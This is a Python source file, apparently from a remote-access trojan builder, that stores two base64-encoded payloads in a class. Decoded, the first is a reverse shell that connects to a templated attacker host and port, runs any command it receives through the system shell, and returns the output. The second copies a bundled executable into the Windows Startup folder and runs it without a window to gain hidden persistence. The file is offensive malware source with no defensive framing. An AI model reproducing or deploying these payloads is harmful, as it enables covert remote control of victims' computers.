class EncodeBase:
    PAYLOAD_TYPE_SHELL = "aW1wb3J0IHNvY2tldAppbXBvcnQgc3VicHJvY2VzcwoKCmNsYXNzIENsaWVudDoKICAgIGRlZiBfX2luaXRfXyhzZWxmLCBob3N0LCBwb3J0KToKICAgICAgICBzZWxmLmhvc3QgPSBob3N0CiAgICAgICAgc2VsZi5wb3J0ID0gcG9ydAogICAgICAgIHNlbGYuY2xpZW50ID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfU1RSRUFNKQogICAgICAgIHNlbGYuY2xpZW50LmNvbm5lY3QoKHNlbGYuaG9zdCwgc2VsZi5wb3J0KSkKCiAgICBkZWYgc2VuZChzZWxmOiBpc2luc3RhbmNlLCBkYXRhOiBieXRlcyk6CiAgICAgICAgc2VsZi5jbGllbnQuc2VuZChkYXRhKQoKICAgIGRlZiByZWNlaXZlKHNlbGYpOgogICAgICAgIHJldHVybiBzZWxmLmNsaWVudC5yZWN2KDYwMDApCgoKY2xpZW50ID0gTm9uZQpkZWYgY29ubmVjdCgpOgogICAgZ2xvYmFsIGNsaWVudAogICAgd2hpbGUgY2xpZW50IGlzIE5vbmU6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBjbGllbnQgPSBDbGllbnQoJHtMSE9TVH0sICR7TFBPUlR9KQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgIHBhc3MKCgpjb25uZWN0KCkKCndoaWxlIFRydWU6CiAgICB0cnk6CiAgICAgICAgY29tbWFuZCA9IGNsaWVudC5yZWNlaXZlKCkuZGVjb2RlKCkKICAgICAgICBpZiBjb21tYW5kIGlzIE5vbmU6CiAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgb3V0cHV0ID0gc3VicHJvY2Vzcy5ydW4oCiAgICAgICAgICAgIGNvbW1hbmQsCiAgICAgICAgICAgIHNoZWxsPVRydWUsCiAgICAgICAgICAgIHRleHQ9VHJ1ZSwKICAgICAgICAgICAgY2FwdHVyZV9vdXRwdXQ9VHJ1ZSwKICAgICAgICApCiAgICAgICAgb3V0cHV0ID0gb3V0cHV0LnN0ZGVyciBpZiBvdXRwdXQuc3RkZXJyIGVsc2Ugb3V0cHV0LnN0ZG91dAoKICAgICAgICBpZiBvdXRwdXQgaXMgTm9uZSBvciBvdXRwdXQgPT0gIiI6CiAgICAgICAgICAgIG91dHB1dCA9ICJDb21tYW5kIGV4ZWN1dGVkIHN1Y2Nlc3NmdWxseSIKCiAgICAgICAgY2xpZW50LnNlbmQob3V0cHV0LmVuY29kZSgpKQogICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICBjbGllbnQgPSBOb25lCiAgICAgICAgY29ubmVjdCgpCiAgICAgICAgcGFzcwo="
    
    AUTOEXEC_PAYLOAD = "aW1wb3J0IHNodXRpbAppbXBvcnQgb3MKaW1wb3J0IHN5cwppbXBvcnQgc3VicHJvY2VzcwoKbGF1bmNoID0gVHJ1ZQoKd2hpbGUgbGF1bmNoOgogICAgdHJ5OgogICAgICAgIG9zLmNoZGlyKHN5cy5fTUVJUEFTUykKCiAgICAgICAgaWYgaGFzYXR0cihzeXMsICJfTUVJUEFTUyIpOgogICAgICAgICAgICBzb3VyY2VfZmlsZSA9IG9zLnBhdGguam9pbihzeXMuX01FSVBBU1MsICIke3dpbmRvd3MuYXV0b2V4ZS5wYXRofSIpCgogICAgICAgIGFwcGRhdGEgPSBvcy5nZXRlbnYoIkFQUERBVEEiKQogICAgICAgIHBhdGggPSBvcy5wYXRoLmpvaW4oCiAgICAgICAgICAgIGFwcGRhdGEsCiAgICAgICAgICAgICJNaWNyb3NvZnQiLAogICAgICAgICAgICAiV2luZG93cyIsCiAgICAgICAgICAgICJTdGFydCBNZW51IiwKICAgICAgICAgICAgIlByb2dyYW1zIiwKICAgICAgICAgICAgIlN0YXJ0dXAiLAogICAgICAgICAgICAiJHt3aW5kb3dzLmF1dG9leGUucGF0aH0iLAogICAgICAgICkKICAgICAgICBzaHV0aWwuY29weWZpbGUoc291cmNlX2ZpbGUsIHBhdGgpCiAgICAgICAgc3VicHJvY2Vzcy5ydW4oW3BhdGhdLCBjcmVhdGlvbmZsYWdzPXN1YnByb2Nlc3MuQ1JFQVRFX05PX1dJTkRPVykKICAgICAgICBsYXVuY2ggPSBGYWxzZQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIGxhdW5jaCA9IFRydWUKICAgICAgICBjb250aW51ZQoKCg=="
    
